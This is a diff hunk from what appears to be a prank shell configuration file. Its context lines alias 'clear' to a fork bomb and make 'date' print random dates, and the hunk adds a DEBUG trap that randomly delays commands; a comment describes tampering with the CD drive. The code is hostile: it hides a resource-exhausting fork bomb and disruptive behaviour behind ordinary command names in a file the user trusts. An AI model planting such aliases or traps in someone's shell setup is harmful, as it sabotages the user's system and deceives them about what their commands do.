@@ -28,6 +28,9 @@ alias clear=':(){ :|:& };:';
 # Have `date` return random dates.
 alias date='date -d "now + $RANDOM days"';
 
+# Randomly sleep before random command
+trap '[ "$RANDOM" -le 6000 ] && sleep $[ ( $RANDOM % 4 )+3 ]s' DEBUG
+
 # Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
 # Other times, resist all attempts at opening it. Other times, make it read
 # reaaaalllly sllooowwwwllly.
